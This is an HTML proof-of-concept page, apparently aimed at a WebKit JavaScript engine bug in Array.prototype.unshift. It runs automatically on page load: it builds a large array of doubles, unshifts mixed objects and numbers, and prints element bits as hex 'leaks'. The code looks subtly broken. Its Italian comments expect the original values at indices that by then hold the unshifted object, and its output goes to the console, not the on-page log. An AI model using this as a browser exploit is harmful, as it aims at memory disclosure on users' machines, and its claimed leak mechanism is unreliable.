<!DOCTYPE html>
<html>
<head>
    <title>JSArray Unshift Exploit</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            margin: 20px;
        }
        #log {
            border: 1px solid #0f0;
            padding: 10px;
            white-space: pre;
        }
    </style>
</head>
<body>
    <h2>WebKit Array Unshift PoC</h2>
    <div id="log">[+] Initializing exploit...</div>

    <script>
        (function() {
            const log = document.getElementById('log');
            let output = [];
            
            function updateLog(msg) {
                output.push(msg);
                if(output.length > 15) output.shift();
                log.textContent = output.join('\n');
            }

            function hex(num) {
                return '0x' + num.toString(16).padStart(16, '0');
            }

            function triggerExploit() {
                try {
                     let arr = [1.1, 2.2, 3.3];
    for(let i = 0; i < 10000; i++)
        arr.push(4.4 + i);  // Evita la deduplicazione

    // Unshift misto (oggetto + double)
    arr.unshift({}, 0.0, {});  // 3 elementi

    // Legge elementi "shiftati"
    let leak1 = arr[2];  // Dovrebbe essere 1.1 (original)
    let leak2 = arr[3];  // Dovrebbe essere 2.2 (original)

    // Conversione a bytes
    let buf = new ArrayBuffer(8);
    new Float64Array(buf)[0] = leak1;
    console.log("Leak 1:", hex(new BigUint64Array(buf)[0]));
    new Float64Array(buf)[0] = leak2;
    console.log("Leak 2:", hex(new BigUint64Array(buf)[0]));
                } catch(e) {
                    updateLog(`[ERROR] ${e}`);
                }
            }

            // Auto-execute after short delay
            setTimeout(triggerExploit, 100);
        })();
    </script>
</body>
</html>
